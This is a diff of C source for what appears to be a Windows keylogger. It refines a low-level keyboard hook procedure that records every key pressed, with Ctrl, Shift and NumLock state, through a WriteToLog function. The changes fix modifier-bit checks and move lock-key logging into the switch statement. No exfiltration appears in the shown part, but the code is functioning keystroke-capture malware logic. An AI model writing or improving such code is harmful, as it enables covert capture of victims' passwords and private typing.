@@ -22,9 +22,9 @@ BOOL CapsLock()
 
 BOOL Ctrl() // if Ctrl is on
 {
-	if (GetKeyState(VK_CONTROL) & 0x8000
-		|| GetKeyState(VK_LCONTROL) & 0x8000
-		|| GetKeyState(VK_RCONTROL) & 0x8000) // higher bit
+	if (((GetKeyState(VK_CONTROL) & 0x8000) >> 15)
+		|| ((GetKeyState(VK_LCONTROL) & 0x8000) >> 15)
+		|| ((GetKeyState(VK_RCONTROL) & 0x8000) >> 15)) // higher bit
 		
 		return true;
 	else
@@ -33,9 +33,9 @@ BOOL Ctrl() // if Ctrl is on
 
 BOOL Shift() // if Shift is on
 {
-	if (GetKeyState(VK_SHIFT) & 0x8000
-		|| GetKeyState(VK_LSHIFT) & 0x8000
-		|| GetKeyState(VK_RSHIFT) & 0x8000) // higher bit
+	if (((GetKeyState(VK_SHIFT) & 0x8000) >> 15)
+		|| ((GetKeyState(VK_LSHIFT) & 0x8000) >> 15)
+		|| ((GetKeyState(VK_RSHIFT) & 0x8000) >> 15)) // higher bit
 		
 		return true;
 	else
@@ -44,7 +44,7 @@ BOOL Shift() // if Shift is on
 
 BOOL NumLock() // if NumLock key is on
 {
-	if (GetKeyState(VK_NUMLOCK) & 0x8000) // higher bit
+	if (GetKeyState(VK_NUMLOCK) & 0x0001) // lower bit
 		return true;
 	else
 		return false;
@@ -59,12 +59,8 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) // to be run 
 
 	if (wParam == WM_KEYDOWN) // if key is down
 	{
-		PKBDLLHOOKSTRUCT key;
-		UINT scan_code;
-		char key_name[16];
-
 		//get the key from lParam
-		key = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
+		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
 		
 		if (Ctrl())
 			WriteToLog("CTRL +");
@@ -75,21 +71,13 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) // to be run 
 		if (NumLock())
 			WriteToLog("NUM +");
 		
-		if (key->vkCode == VK_CAPITAL)
-			WriteToLog("CAPSLOCK");
-		
-		if (key->vkCode == VK_SCROLL)
-			WriteToLog("SCROLLLOCK");
-		
-		if (key->vkCode == VK_NUMLOCK)
-			WriteToLog("NUM");
-		
 		if ((key->vkCode >= 0x30 && key->vkCode <= 0x39)
 			|| (key->vkCode >= 0x41 && key->vkCode <= 0x5A))
 		{
-			scan_code = MapVirtualKey(key->vkCode, 0);
+			UINT scan_code = MapVirtualKey(key->vkCode, 0);
 			scan_code <<= 16; //shift 16 bits
-			GetKeyNameTextA(scan_code,key_name,16); // copies scan_code to key_name_buf
+			char key_name[16];
+			GetKeyNameTextA(scan_code,key_name,16); // copies scan_code to key_name
 			WriteToLog(key_name);
 		}
 
@@ -150,6 +138,9 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) // to be run 
 		case VK_SUBTRACT:	WriteToLog("Num -");		break;
 		case VK_DECIMAL:	WriteToLog("Num .");		break;
 		case VK_DIVIDE:		WriteToLog("Num /");		break;
+		case VK_CAPITAL:	WriteToLog("CAPSLOCK");		break;
+		case VK_SCROLL:		WriteToLog("SCROLLLOCK");	break;
+		case VK_NUMLOCK:	WriteToLog("NUM");			break;
 		}
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
